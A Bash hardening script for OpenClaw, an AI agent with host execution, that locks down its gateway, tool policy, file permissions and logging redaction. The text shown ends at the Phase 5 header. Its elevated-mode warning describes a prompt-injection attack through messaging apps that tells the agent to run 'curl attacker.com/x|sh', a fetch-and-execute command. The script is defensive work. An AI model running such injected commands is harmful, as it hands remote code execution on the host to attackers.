#!/usr/bin/env bash

# =============================================================================
# Script:      openclaw.sh
# Description: Deep-dive security hardening for OpenClaw (formerly ClawdBot/
#              Moltbot) on Arch Linux. OpenClaw is a self-hosted AI agent that
#              bridges messaging platforms to an AI coding agent with host
#              execution capabilities — making it a high-value target.
#
#              This script applies 27 hardening steps across 15 phases:
#                - System prerequisites and Node.js version verification
#                - Gateway authentication and bind-to-loopback enforcement
#                - Channel & DM policy lockdown (pairing-only)
#                - Tool policy and execution security (sandbox, allowlist)
#                - Docker sandbox configuration (optional)
#                - Plugin and skill registry lockdown
#                - Secure logging with sensitive data redaction
#                - File permissions and credential isolation
#                - Root-owned hardened systemd system service (runs as the
#                  dedicated user) with drop-in overrides
#                - nftables firewall rules (optional)
#                - AppArmor confinement profile (optional)
#                - Workspace git initialization for rollback
#                - Security audit automation via systemd timer
#                - Dangerous command denylist documentation
#                - Pure-Bash secret scanning pre-commit hook (optional gitleaks)
#
# Author:      Bruno Schmid @brulliant
# LinkedIn:    https://www.linkedin.com/in/schmidbruno/
#
# Usage:       sudo ./openclaw.sh -u USERNAME [-p PORT] [--with-sandbox]
#                                 [--with-firewall] [--with-apparmor] [-h]
#
# Requirements:
#   - Arch Linux with pacman
#   - Root privileges
#   - OpenClaw installed and accessible to the target user
#   - Node.js >= 22.12.0
#
# What this script does:
#   1.  Verifies Node.js >= 22.12.0 is installed (CVE patch baseline)
#   2.  Creates/verifies a dedicated non-root user for OpenClaw
#   3.  Generates a cryptographic gateway authentication token
#   4.  Writes a hardened openclaw.json with loopback-only binding
#   5.  Retains OpenClaw's pairing defaults for newly configured channels
#   6.  Sets tool profile to minimal "messaging" with shell blocked
#   7.  Denies host execution and leaves an empty approval allowlist
#   8.  Disables elevated mode entirely
#   9.  Restricts web tools and disables browser automation
#   10. Blocks cross-context messaging between sessions
#   11. Configures Docker sandbox with strict resource limits (optional)
#   12. Locks down plugin system to deny-by-default
#   13. Disables hooks to prevent prompt injection
#   14. Configures secure logging with API key redaction
#   15. Sets up log rotation via logrotate
#   16. Locks down all file permissions (700/600 principle)
#   17. Creates a secure environment file for credentials
#   18. Creates a root-owned systemd system service that runs as the user
#       (and migrates away from the old user-level units)
#   19. Creates a systemd hardening drop-in with full sandboxing
#   20. Writes nftables firewall rules for loopback-only access (optional)
#   21. Creates an AppArmor confinement profile (optional)
#   22. Initializes workspace as a git repo for rollback
#   23. Runs openclaw security audit if CLI is available
#   24. Creates a weekly security audit systemd timer
#   25. Documents dangerous commands that must never be allowlisted
#   26. Installs a pure-Bash secret-scanning git pre-commit hook (and uses gitleaks if installed)
#   27. Prints comprehensive security summary and next steps
# =============================================================================

set -euo pipefail
umask 022

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
# shellcheck disable=SC1090,SC1091
source "$SCRIPT_DIR/../lib/nftables.sh"

# --- Colors ---
readonly C_BLUE='\033[1;34m'
readonly C_RED='\033[1;31m'
readonly C_GREEN='\033[1;32m'
readonly C_YELLOW='\033[1;33m'
readonly C_NC='\033[0m'

msg()  { printf "%b[+]%b %s\n" "$C_GREEN" "$C_NC" "$1"; }
info() { printf "%b[*]%b %s\n" "$C_BLUE"  "$C_NC" "$1"; }
warn() { printf "%b[!]%b %s\n" "$C_YELLOW" "$C_NC" "$1"; }
err()  { printf "%b[!]%b %s\n" "$C_RED"   "$C_NC" "$1" >&2; exit 1; }

# --- Defaults ---
OC_USER=""
OC_PORT=18789
WITH_SANDBOX=false
WITH_FIREWALL=false
WITH_APPARMOR=false
LOGFILE="/var/log/openclaw-hardening-$(date +%Y%m%d-%H%M%S).log"

# --- Usage ---
usage() {
    cat <<EOF
Usage: sudo $0 [options]

Required:
  -u USERNAME         Linux user who runs OpenClaw (must not be root)

Optional:
  -p PORT             Gateway WebSocket port (default: $OC_PORT)
  --with-sandbox      Configure a verified rootless Docker sandbox
  --with-firewall     Write nftables rules for loopback-only gateway access
  --with-apparmor     Create and load an AppArmor confinement profile
  -h, --help          Show this help

Examples:
  sudo $0 -u alice
  sudo $0 -u alice -p 19000 --with-sandbox --with-firewall
  sudo $0 -u alice --with-sandbox --with-apparmor
EOF
    exit 0
}

# --- Parse Arguments ---
need_arg() { [[ $# -ge 2 && -n "${2:-}" ]] || err "Option $1 requires a value"; }
while [[ $# -gt 0 ]]; do
    case "$1" in
        -u)              need_arg "$@"; OC_USER="$2"; shift 2 ;;
        -p)              need_arg "$@"; OC_PORT="$2"; shift 2 ;;
        --with-sandbox)  WITH_SANDBOX=true; shift ;;
        --with-firewall) WITH_FIREWALL=true; shift ;;
        --with-apparmor) WITH_APPARMOR=true; shift ;;
        -h|--help)       usage ;;
        *)               err "Unknown option: $1" ;;
    esac
done

# --- Validate ---
[[ $(id -u) -eq 0 ]] || err "Must be run as root"
[[ -n "$OC_USER" ]] || err "Username is required (-u USERNAME)"
[[ "$OC_USER" != "root" ]] || err "OpenClaw must NOT run as root. Specify a non-root user."
# The user name becomes part of root-owned unit file names
# (openclaw-gateway-<user>.service), so it is limited to unit-name-safe
# characters and the 32-character login name limit.
[[ "$OC_USER" =~ ^[a-z_][a-z0-9_-]*$ ]] || err "Invalid username: $OC_USER"
[[ ${#OC_USER} -le 32 ]] || err "Invalid username (longer than 32 characters): $OC_USER"

# Validate port is numeric
if ! [[ "$OC_PORT" =~ ^[0-9]+$ ]] || [[ "$OC_PORT" -lt 1 ]] || [[ "$OC_PORT" -gt 65535 ]]; then
    err "Invalid port number: $OC_PORT (must be 1-65535)"
fi

# Redirect output to logfile as well
install -d -m 0755 /var/log
( umask 077 && : > "$LOGFILE" )
chmod 0600 "$LOGFILE"
exec > >(tee -a "$LOGFILE") 2>&1

# --- Resolve home directory (refined via getent after user creation if needed) ---
OC_HOME=$(getent passwd "$OC_USER" | cut -d: -f6 || true)
OC_HOME="${OC_HOME:-/home/$OC_USER}"
OC_DIR="$OC_HOME/.openclaw"
OC_CONFIG="$OC_DIR/openclaw.json"
OC_WORKSPACE="$OC_DIR/workspace"
OC_CREDENTIALS="$OC_DIR/credentials"
OC_ENV_FILE="$OC_DIR/.env"
# shellcheck disable=SC2034  # Available for session cleanup functions
OC_SESSIONS_GLOB="$OC_DIR/agents/*/sessions"
OC_EXEC_APPROVALS="$OC_DIR/exec-approvals.json"

echo
echo -e "${C_GREEN}========================================================================${C_NC}"
echo -e "${C_GREEN}    OpenClaw Security Hardening for Arch Linux${C_NC}"
echo -e "${C_GREEN}========================================================================${C_NC}"
echo
echo -e "${C_RED}    WARNING: OpenClaw is an AI agent with HOST EXECUTION capabilities.${C_NC}"
echo -e "${C_RED}    A misconfigured instance grants remote shell access to ANYONE who${C_NC}"
echo -e "${C_RED}    can send a direct message via any connected messaging platform.${C_NC}"
echo -e "${C_RED}    923+ instances have been found exposed on Shodan.${C_NC}"
echo -e "${C_RED}    This script applies defense-in-depth hardening.${C_NC}"
echo
info "Target user:        $OC_USER"
info "OpenClaw home:      $OC_DIR"
info "Gateway port:       $OC_PORT"
info "Docker sandbox:     $WITH_SANDBOX"
info "nftables firewall:  $WITH_FIREWALL"
info "AppArmor profile:   $WITH_APPARMOR"
info "Log:                $LOGFILE"
echo

# =============================================================================
# PHASE 1: SYSTEM PREREQUISITES
# =============================================================================

echo -e "${C_BLUE}--- Phase 1: System Prerequisites ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 1: Verify Node.js version
# -----------------------------------------------------------------------------

msg "Step 1: Verifying Node.js version..."

if ! command -v node &>/dev/null; then
    err "Node.js is not installed. Install Node.js >= 22.12.0 first: pacman -S nodejs"
fi

NODE_VER_RAW=$(node --version 2>/dev/null)
NODE_VER="${NODE_VER_RAW#v}"
info "Detected Node.js version: $NODE_VER_RAW"

# Parse major.minor.patch (strip any pre-release/pkgrel suffix)
IFS='.' read -r NODE_MAJOR NODE_MINOR NODE_PATCH _ <<< "$NODE_VER"
NODE_MAJOR="${NODE_MAJOR%%[^0-9]*}"
NODE_MINOR="${NODE_MINOR%%[^0-9]*}"
NODE_PATCH="${NODE_PATCH%%[^0-9]*}"
NODE_MAJOR="${NODE_MAJOR:-0}"
NODE_MINOR="${NODE_MINOR:-0}"
NODE_PATCH="${NODE_PATCH:-0}"

if [[ "$NODE_MAJOR" -lt 22 ]]; then
    err "Node.js $NODE_VER_RAW is too old. OpenClaw requires >= 22.12.0 (CVE patches). Upgrade: pacman -Syu nodejs"
elif [[ "$NODE_MAJOR" -eq 22 ]] && [[ "$NODE_MINOR" -lt 12 ]]; then
    warn "Node.js $NODE_VER_RAW is below 22.12.0 — missing critical CVE patches."
    warn "Strongly recommended: pacman -Syu nodejs"
    warn "CVEs addressed in 22.12.0+: HTTP request smuggling, path traversal,"
    warn "V8 type confusion, and permission model bypasses."
elif [[ "$NODE_MAJOR" -eq 22 ]] && [[ "$NODE_MINOR" -eq 12 ]] && [[ "$NODE_PATCH" -eq 0 ]]; then
    msg "Node.js $NODE_VER_RAW meets the minimum security baseline (22.12.0)"
else
    msg "Node.js $NODE_VER_RAW meets the security baseline (>= 22.12.0)"
fi

# Check for pnpm (OpenClaw's package manager)
if command -v pnpm &>/dev/null; then
    PNPM_VER=$(pnpm --version 2>/dev/null || echo "unknown")
    info "pnpm version: $PNPM_VER"
else
    warn "pnpm not found. OpenClaw uses pnpm as its package manager."
    warn "Install with: npm install -g pnpm"
fi

# -----------------------------------------------------------------------------
# Step 2: Create/verify dedicated user
# -----------------------------------------------------------------------------

msg "Step 2: Verifying dedicated user '$OC_USER'..."

if id "$OC_USER" &>/dev/null; then
    info "User '$OC_USER' already exists"

    # Verify user is not UID 0
    USER_UID=$(id -u "$OC_USER")
    if [[ "$USER_UID" -eq 0 ]]; then
        err "User '$OC_USER' has UID 0 (root). OpenClaw must NOT run as root."
    fi
    msg "User '$OC_USER' (UID $USER_UID) is non-root — OK"
else
    info "Creating restricted user '$OC_USER'..."
    useradd \
        --system \
        --shell /bin/bash \
        --create-home \
        --home-dir "$OC_HOME" \
        --comment "OpenClaw AI agent service account" \
        "$OC_USER"
    msg "Created system user: $OC_USER"
fi
USER_UID=$(id -u "$OC_USER")
OC_GROUP=$(id -gn "$OC_USER")
OC_HOME=$(getent passwd "$OC_USER" | cut -d: -f6)
[[ -n "$OC_HOME" && -d "$OC_HOME" ]] || err "Could not resolve home directory for user '$OC_USER'"
OC_DIR="$OC_HOME/.openclaw"
OC_CONFIG="$OC_DIR/openclaw.json"
OC_WORKSPACE="$OC_DIR/workspace"
OC_CREDENTIALS="$OC_DIR/credentials"
OC_ENV_FILE="$OC_DIR/.env"
# shellcheck disable=SC2034  # Available for session cleanup functions
OC_SESSIONS_GLOB="$OC_DIR/agents/*/sessions"
OC_EXEC_APPROVALS="$OC_DIR/exec-approvals.json"

# -----------------------------------------------------------------------------
# Service-account tree: root never dereferences a path the account controls
# -----------------------------------------------------------------------------
# Everything under $OC_HOME can be rearranged by the service account (symlinks,
# renames), and the agent has read/write access to $OC_DIR by design. A
# root-side write, chmod or chown on such a path can be redirected to any file
# on the system, and re-running this script is a supported flow. So every
# create/write/chmod/mkdir below $OC_HOME runs as $OC_USER; root only streams
# content to it and inspects ownership with checks that do not follow links.

# Paths embedded in root-owned unit files and the AppArmor profile must not
# carry whitespace, quotes, specifiers (%), variables ($) or glob characters.
is_safe_path() {
    [[ "$1" =~ ^(/[A-Za-z0-9._+@-]+)+$ && "$1/" != */../* && "$1/" != */./* ]]
}

# Run a command as the service account, from a directory it can always reach.
oc_run() {
    runuser -u "$OC_USER" -- env -C / HOME="$OC_HOME" "$@"
}

# oc_mkdir MODE DIR...: create (or tighten) directories as the service account.
# An existing path that is a symlink, not a directory, or not owned by the
# account is refused instead of being followed or "repaired" by root.
oc_mkdir() {
    local mode="$1"
    shift
    oc_run bash -c '
        set -euo pipefail
        mode=$1
        shift
        for dir in "$@"; do
            if [[ -L "$dir" ]] || { [[ -e "$dir" ]] && [[ ! -d "$dir" || ! -O "$dir" ]]; }; then
                printf "Refusing %s: symlink, not a directory, or not owned by the service account\n" "$dir" >&2
                exit 1
            fi
            mkdir -p -- "$dir"
            chmod -- "$mode" "$dir"
        done
    ' _ "$mode" "$@" || err "Could not prepare directory as $OC_USER: $*"
}

# oc_write_file MODE DEST: write stdin to DEST as the service account. The
# content lands in a temporary file in the same directory and is renamed over
# DEST, so an existing symlink at DEST is replaced, never followed.
oc_write_file() {
    local mode="$1" dest="$2"
    oc_run bash -c '
        set -euo pipefail
        umask 077
        mode=$1 dest=$2
        tmp=$(mktemp -- "${dest%/*}/.${dest##*/}.XXXXXX")
        if ! { cat > "$tmp" && chmod -- "$mode" "$tmp" && mv -fT -- "$tmp" "$dest"; }; then
            rm -f -- "$tmp"
            exit 1
        fi
    ' _ "$mode" "$dest" || err "Could not write $dest as $OC_USER"
}

# oc_file_state PATH: print "missing", "regular" (a plain file owned by the
# account) or "other" (symlink, directory, FIFO, foreign-owned, ...) as seen by
# the service account, without following a final symlink.
oc_file_state() {
    local rc=0
    oc_run bash -c '
        [[ -e "$1" || -L "$1" ]] || exit 10
        [[ ! -L "$1" && -f "$1" && -O "$1" ]] && exit 11
        exit 12
    ' _ "$1" || rc=$?
    case "$rc" in
        10) echo missing ;;
        11) echo regular ;;
        *)  echo other ;;
    esac
}

# oc_chmod_file MODE FILE...: chmod plain files as the service account. Missing
# paths are skipped; a planted symlink or foreign-owned entry is reported and
# left untouched.
oc_chmod_file() {
    local mode="$1" file
    shift
    for file in "$@"; do
        case "$(oc_file_state "$file")" in
            regular)
                if oc_run chmod -- "$mode" "$file"; then
                    info "  $file -> $mode"
                else
                    warn "  Could not chmod $file as $OC_USER"
                fi
                ;;
            other)
                warn "  NOT TOUCHED: $file is a symlink, not a regular file, or not owned by $OC_USER — inspect it"
                ;;
        esac
    done
}

# Talk to the account's own user manager (only used to retire legacy units).
run_user_systemctl() {
    systemctl --machine="${OC_USER}@" --user "$@" 2>/dev/null || \
        runuser -u "$OC_USER" -- env \
            XDG_RUNTIME_DIR="/run/user/${USER_UID}" \
            DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/${USER_UID}/bus" \
            systemctl --user "$@" 2>/dev/null
}

# Refuse a home or .openclaw that root could be tricked through. stat and -L
# look at the entry itself, never at a symlink target.
is_safe_path "$OC_HOME" || \
    err "Home directory '$OC_HOME' contains characters that cannot be embedded safely in systemd units and AppArmor rules."
[[ ! -L "$OC_HOME" ]] || \
    err "Home directory $OC_HOME is a symbolic link; point the account at the real directory before hardening it."
[[ "$(stat -c %u -- "$OC_HOME")" == "$USER_UID" ]] || \
    err "Home directory $OC_HOME is not owned by '$OC_USER'; refusing to manage an OpenClaw tree inside it."
if [[ -L "$OC_DIR" ]]; then
    err "$OC_DIR is a symbolic link; refusing to follow it. Inspect it, remove it and re-run."
elif [[ -e "$OC_DIR" ]]; then
    [[ -d "$OC_DIR" ]] || err "$OC_DIR exists but is not a directory; refusing to continue."
    [[ "$(stat -c %u -- "$OC_DIR")" == "$USER_UID" ]] || \
        err "$OC_DIR is not owned by '$OC_USER'; refusing to continue. Root does not change ownership inside the service account's tree."
fi

# Root-private scratch space (mode 0700 under /run). Content that needs
# root-side variables is built here and streamed to oc_write_file.
ROOT_TMP=$(mktemp -d /run/openclaw-hardening.XXXXXX)
trap 'rm -rf -- "$ROOT_TMP"' EXIT

# Root-owned helpers and per-user system units (see Phase 9).
SYSTEMD_SYSTEM_DIR="/etc/systemd/system"
GATEWAY_UNIT="openclaw-gateway-$OC_USER.service"
AUDIT_UNIT="openclaw-audit-$OC_USER.service"
AUDIT_TIMER="openclaw-audit-$OC_USER.timer"
OC_LIBEXEC_DIR="/usr/local/lib/openclaw-hardening"
OC_ENV_LAUNCHER="$OC_LIBEXEC_DIR/openclaw-env-exec"
AUDIT_SCRIPT="$OC_LIBEXEC_DIR/openclaw-security-audit"

# Resolve the CLI before changing any OpenClaw state. The generated config is
# validated with this exact binary before it replaces the live configuration.
OPENCLAW_BIN=""
if command -v openclaw &>/dev/null; then
    OPENCLAW_BIN=$(command -v openclaw)
elif [[ -x "/usr/local/bin/openclaw" ]]; then
    OPENCLAW_BIN="/usr/local/bin/openclaw"
elif [[ -x "$OC_HOME/.local/bin/openclaw" ]]; then
    OPENCLAW_BIN="$OC_HOME/.local/bin/openclaw"
else
    err "OpenClaw CLI not found. Install OpenClaw before running this script."
fi
is_safe_path "$OPENCLAW_BIN" || \
    err "OpenClaw binary path '$OPENCLAW_BIN' contains characters that cannot be embedded safely in a systemd unit."
info "OpenClaw binary: $OPENCLAW_BIN"

# Paths the AppArmor profile will name are resolved and checked here, before
# any state changes, so a rejected path cannot leave a unit that references a
# profile which was never written.
APPARMOR_DIR="/etc/apparmor.d"
if [[ "$WITH_APPARMOR" == true ]]; then
    NODE_BIN=$(command -v node 2>/dev/null || echo "/usr/bin/node")
    NODE_BIN_REAL=$(realpath "$NODE_BIN" 2>/dev/null || echo "$NODE_BIN")
    OPENCLAW_BIN_REAL=$(realpath "$OPENCLAW_BIN" 2>/dev/null || echo "$OPENCLAW_BIN")
    for apparmor_path in "$NODE_BIN" "$NODE_BIN_REAL" "$OPENCLAW_BIN_REAL"; do
        is_safe_path "$apparmor_path" || \
            err "Path '$apparmor_path' contains characters that cannot be embedded safely in an AppArmor profile."
    done

    # The profile name is shared, but its rules name one account's paths.
    # Replacing it would re-confine another account's running gateway with the
    # wrong paths now that the profile is actually enforced.
    if [[ -f "$APPARMOR_DIR/openclaw-gateway" ]] && \
       ! grep -qF -- "$OC_DIR/" "$APPARMOR_DIR/openclaw-gateway"; then
        err "$APPARMOR_DIR/openclaw-gateway was generated for a different account. Only one account per host can use --with-apparmor; remove that profile first or run without --with-apparmor."
    fi
fi

# The system Docker group grants control of the root-owned Docker daemon and is
# therefore equivalent to host root. Sandbox mode requires a rootless daemon
# owned by the OpenClaw account instead.
SANDBOX_DOCKER_SOCKET=""
if [[ "$WITH_SANDBOX" == true ]]; then
    if id -nG "$OC_USER" | tr ' ' '\n' | grep -qx docker; then
        err "User '$OC_USER' is in the docker group, which grants host-root access. Remove that membership and configure rootless Docker before enabling the sandbox."
    fi

    SANDBOX_DOCKER_SOCKET="/run/user/${USER_UID}/docker.sock"
    [[ -S "$SANDBOX_DOCKER_SOCKET" ]] || \
        err "Rootless Docker socket not found at $SANDBOX_DOCKER_SOCKET. Configure rootless Docker for '$OC_USER' first."

    if ! runuser -u "$OC_USER" -- env \
        DOCKER_HOST="unix://$SANDBOX_DOCKER_SOCKET" \
        docker info &>/dev/null; then
        err "User '$OC_USER' cannot access the rootless Docker daemon at $SANDBOX_DOCKER_SOCKET."
    fi
    msg "Rootless Docker sandbox verified for '$OC_USER'"
fi

# Ensure OpenClaw directories exist (created by the account itself)
oc_mkdir 0700 "$OC_DIR" "$OC_WORKSPACE" "$OC_CREDENTIALS"

echo

# =============================================================================
# PHASE 2: GATEWAY HARDENING
# =============================================================================

echo -e "${C_BLUE}--- Phase 2: Gateway Hardening ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 3: Generate or preserve gateway authentication token
# -----------------------------------------------------------------------------

msg "Step 3: Configuring gateway authentication token..."

GATEWAY_TOKEN=""
ENV_FILE_STATE=$(oc_file_state "$OC_ENV_FILE")
[[ "$ENV_FILE_STATE" != other ]] || \
    err "$OC_ENV_FILE is a symlink, not a regular file, or not owned by '$OC_USER'. Root will not read or replace it; inspect it, move it aside and re-run."
if [[ "$ENV_FILE_STATE" == regular ]]; then
    # The file belongs to the account the agent runs as: read it as that
    # account and treat the value purely as data.
    GATEWAY_TOKEN=$(oc_run awk -F= '/^[[:space:]]*OPENCLAW_GATEWAY_TOKEN=/ {
        sub(/^[[:space:]]*OPENCLAW_GATEWAY_TOKEN=/, "")
        gsub(/^[[:space:]"'\'']+|[[:space:]"'\'']+$/, "")
        print
        exit
    }' "$OC_ENV_FILE" 2>/dev/null | head -c 4096 || true)
    if [[ -n "$GATEWAY_TOKEN" && "$GATEWAY_TOKEN" != REPLACE_* ]] && \
       ! [[ ${#GATEWAY_TOKEN} -le 512 && "$GATEWAY_TOKEN" =~ ^[A-Za-z0-9._~+/=-]+$ ]]; then
        warn "Existing OPENCLAW_GATEWAY_TOKEN in $OC_ENV_FILE is not a plain token ([A-Za-z0-9._~+/=-], max 512 chars)"
        warn "A NEW token will be generated; update every client that used the old one"
        GATEWAY_TOKEN=""
    fi
fi

if [[ -n "$GATEWAY_TOKEN" && "$GATEWAY_TOKEN" != REPLACE_* ]]; then
    info "Preserving existing gateway authentication token from $OC_ENV_FILE"
else
    GATEWAY_TOKEN=$(openssl rand -hex 32)
    info "Generated 256-bit cryptographic token for gateway authentication"
    info "Token will be stored in $OC_ENV_FILE (never in openclaw.json)"
fi

# -----------------------------------------------------------------------------
# Step 4: Write hardened openclaw.json
# -----------------------------------------------------------------------------

msg "Step 4: Writing hardened openclaw.json..."

EXEC_HOST_MODE="sandbox"
# Built in root-private scratch space, never directly inside $OC_DIR.
OC_CONFIG_TMP="$ROOT_TMP/openclaw.json"

cat > "$OC_CONFIG_TMP" <<OPENCLAW_JSON_HEAD
{
  "gateway": {
    "mode": "local",
    "bind": "loopback",
    "port": $OC_PORT,
    "auth": {
      "mode": "token",
      "token": "\${OPENCLAW_GATEWAY_TOKEN}",
      "rateLimit": {
        "maxAttempts": 5,
        "windowMs": 60000,
        "lockoutMs": 300000,
        "exemptLoopback": false
      }
    },
    "controlUi": {
      "allowInsecureAuth": false,
      "dangerouslyDisableDeviceAuth": false
    },
    "trustedProxies": [],
    "tailscale": {
      "mode": "off",
      "resetOnExit": true
    }
  },
  "agents": {
    "defaults": {
      "workspace": "$OC_WORKSPACE",
OPENCLAW_JSON_HEAD

if [[ "$WITH_SANDBOX" == true ]]; then
    cat >> "$OC_CONFIG_TMP" <<'OPENCLAW_JSON_SANDBOX'
      "sandbox": {
        "mode": "all",
        "backend": "docker",
        "scope": "session",
        "workspaceAccess": "ro",
        "docker": {
          "network": "none",
          "readOnlyRoot": true,
          "tmpfs": ["/tmp:rw,noexec,nosuid,size=64m"],
          "capDrop": ["ALL"],
          "pidsLimit": 256,
          "memory": "512m",
          "memorySwap": "512m",
          "cpus": 0.5,
          "user": "1000:1000"
        },
        "browser": {
          "enabled": false,
          "allowHostControl": false
        }
      }
OPENCLAW_JSON_SANDBOX
else
    cat >> "$OC_CONFIG_TMP" <<'OPENCLAW_JSON_NOSANDBOX'
      "sandbox": {
        "mode": "off"
      }
OPENCLAW_JSON_NOSANDBOX
fi

cat >> "$OC_CONFIG_TMP" <<'OPENCLAW_JSON_TAIL'
    }
  },
  "tools": {
    "profile": "messaging",
    "deny": ["exec", "process", "apply_patch", "browser"],
    "exec": {
      "host": "sandbox",
      "security": "allowlist",
      "ask": "always",
      "safeBins": [],
      "strictInlineEval": true,
      "timeoutSec": 300
    },
    "elevated": {
      "enabled": false,
      "allowFrom": {}
    },
    "web": {
      "search": {
        "enabled": true,
        "maxResults": 10,
        "timeoutSeconds": 15
      },
      "fetch": {
        "enabled": true,
        "maxChars": 100000,
        "maxRedirects": 3,
        "timeoutSeconds": 20,
        "useTrustedEnvProxy": false
      }
    },
    "message": {
      "crossContext": {
        "allowWithinProvider": false,
        "allowAcrossProviders": false,
        "marker": {
          "enabled": true
        }
      }
    },
    "sandbox": {
      "tools": {
        "deny": ["browser", "nodes", "cron", "gateway"]
      }
    }
  },
  "browser": {
    "enabled": false,
    "evaluateEnabled": false,
    "noSandbox": false,
    "ssrfPolicy": {
      "dangerouslyAllowPrivateNetwork": false,
      "allowedHostnames": []
    }
  },
  "plugins": {
    "enabled": true,
    "allow": [],
    "deny": [],
    "bundledDiscovery": "allowlist"
  },
  "skills": {
    "allowBundled": [],
    "install": {
      "nodeManager": "pnpm",
      "allowUploadedArchives": false
    }
  },
  "hooks": {
    "enabled": false,
    "allowRequestSessionKey": false,
    "allowedSessionKeyPrefixes": [],
    "allowedAgentIds": []
  },
  "logging": {
    "level": "info",
    "consoleLevel": "info",
    "consoleStyle": "compact",
    "redactSensitive": "tools",
    "redactPatterns": [
      "sk-[a-zA-Z0-9_-]{20,}",
      "sk-ant-[a-zA-Z0-9_-]{20,}",
      "anthropic[_-]?api[_-]?key[=:\\s]+[a-zA-Z0-9_-]+",
      "Bearer\\s+[a-zA-Z0-9._-]+",
      "-----BEGIN\\s+(RSA|EC|OPENSSH|PGP)\\s+PRIVATE\\s+KEY-----",
      "password\\s*[:=]\\s*\\S+",
      "OPENAI_API_KEY[=:\\s]+[a-zA-Z0-9_-]+",
      "ghp_[a-zA-Z0-9]{36,}",
      "glpat-[a-zA-Z0-9_-]{20,}",
      "xox[bpors]-[a-zA-Z0-9-]+"
    ]
  }
}
OPENCLAW_JSON_TAIL

# NEVER execute $OPENCLAW_BIN as root (it may reside under $OC_HOME/.local/bin).
# The account receives a candidate copy to validate; root keeps the original.
OC_CONFIG_CANDIDATE="$OC_DIR/.openclaw.json.candidate"
oc_write_file 0600 "$OC_CONFIG_CANDIDATE" < "$OC_CONFIG_TMP"

if ! runuser -u "$OC_USER" -- env \
    HOME="$OC_HOME" \
    OPENCLAW_CONFIG_PATH="$OC_CONFIG_CANDIDATE" \
    OPENCLAW_GATEWAY_TOKEN="$GATEWAY_TOKEN" \
    "$OPENCLAW_BIN" config validate; then
    oc_run rm -f -- "$OC_CONFIG_CANDIDATE" || true
    err "Generated OpenClaw configuration failed validation; live config was not changed."
fi

# Back up only after the replacement has passed the installed CLI's schema.
# The copy is made by the account, so a planted symlink is never read as root.
case "$(oc_file_state "$OC_CONFIG")" in
    regular)
        BACKUP_NAME="$OC_CONFIG.backup.$(date +%Y%m%d-%H%M%S)"
        oc_run install -p -m 0600 -- "$OC_CONFIG" "$BACKUP_NAME" || \
            err "Could not back up $OC_CONFIG as $OC_USER; live config was not changed."
        msg "Backed up existing config to: $BACKUP_NAME"
        ;;
    other)
        warn "$OC_CONFIG is a symlink, not a regular file, or not owned by $OC_USER"
        warn "It is replaced without a backup — inspect where it pointed"
        ;;
esac

# Install root's own copy (not the candidate the account could have edited)
# with an atomic rename that replaces, rather than follows, a symlink.
oc_write_file 0600 "$OC_CONFIG" < "$OC_CONFIG_TMP"
oc_run rm -f -- "$OC_CONFIG_CANDIDATE" || true
rm -f -- "$OC_CONFIG_TMP"
msg "Validated hardened openclaw.json installed at: $OC_CONFIG (mode 600)"

echo

# =============================================================================
# PHASE 3: CHANNEL & DM POLICY LOCKDOWN
# =============================================================================

echo -e "${C_BLUE}--- Phase 3: Channel & DM Policy Lockdown ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 5: DM policy verification (already written into config above)
# -----------------------------------------------------------------------------

msg "Step 5: Channel access kept at OpenClaw's pairing defaults"
info "No placeholder channel blocks are emitted; current OpenClaw connectors"
info "default direct messages to pairing until an operator configures a channel."
info "Review each configured channel's dmPolicy and groupPolicy after onboarding."
warn "NEVER set dmPolicy to 'open' — this allows ANYONE to trigger AI actions"

echo

# =============================================================================
# PHASE 4: TOOL POLICY & EXECUTION SECURITY
# =============================================================================

echo -e "${C_BLUE}--- Phase 4: Tool Policy & Execution Security ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 6: Tool profile (already in config)
# -----------------------------------------------------------------------------

msg "Step 6: Tool profile set to 'messaging' (minimal)"
info "The 'messaging' profile allows AI to read and reply to messages"
info "Shell execution, file writes, and code execution are blocked by default"

# -----------------------------------------------------------------------------
# Step 7: Exec security (already in config)
# -----------------------------------------------------------------------------

msg "Step 7: Exec security configured"
info "  - host: $EXEC_HOST_MODE"
info "  - exec, process, apply_patch, and browser tools: explicitly denied"
info "  - security: allowlist, ask: always, safeBins: empty"
info "  - timeout: 300s if an operator deliberately re-enables exec"

# -----------------------------------------------------------------------------
# Step 8: Disable elevated mode
# -----------------------------------------------------------------------------

msg "Step 8: Elevated mode DISABLED"
echo
echo -e "${C_RED}    ================================================================${C_NC}"
echo -e "${C_RED}    ELEVATED MODE WARNING${C_NC}"
echo -e "${C_RED}    ================================================================${C_NC}"
echo -e "${C_RED}    OpenClaw's elevated mode grants the AI agent UNRESTRICTED${C_NC}"
echo -e "${C_RED}    shell access to the host machine. Combined with:${C_NC}"
echo -e "${C_RED}      - dmPolicy: 'open' (anyone can message the AI)${C_NC}"
echo -e "${C_RED}      - allowFrom: '*' (wildcard, no contact filtering)${C_NC}"
echo -e "${C_RED}    This creates a REMOTE CODE EXECUTION vulnerability${C_NC}"
echo -e "${C_RED}    accessible to ANYONE on any connected messaging platform.${C_NC}"
echo -e "${C_RED}${C_NC}"
echo -e "${C_RED}    Attack scenario: An attacker sends a crafted message via${C_NC}"
echo -e "${C_RED}    WhatsApp/Telegram/Discord containing a prompt injection${C_NC}"
echo -e "${C_RED}    that instructs the AI to execute 'curl attacker.com/x|sh'.${C_NC}"
echo -e "${C_RED}${C_NC}"
echo -e "${C_RED}    Elevated mode is now DISABLED in openclaw.json.${C_NC}"
echo -e "${C_RED}    DO NOT re-enable it unless you understand the risks.${C_NC}"
echo -e "${C_RED}    ================================================================${C_NC}"
echo

# -----------------------------------------------------------------------------
# Step 9: Web tool restrictions (already in config)
# -----------------------------------------------------------------------------

msg "Step 9: Web tool restrictions applied"
info "  - Web search: enabled (10-result limit)"
info "  - Web fetch: enabled (100KB char limit)"
info "  - Browser automation: DISABLED (prevents SSRF, data exfiltration)"

# -----------------------------------------------------------------------------
# Step 10: Cross-context messaging blocked (already in config)
# -----------------------------------------------------------------------------

msg "Step 10: Cross-context messaging blocked"
info "  - allowAcrossProviders: false"
info "  - marker.enabled: true (context boundaries are marked)"
info "  - Prevents session data leakage between channels"

echo

# =============================================================================
# PHASE 5: SANDBOX CONFIGURATION (--with-sandbox)
# =============================================================================

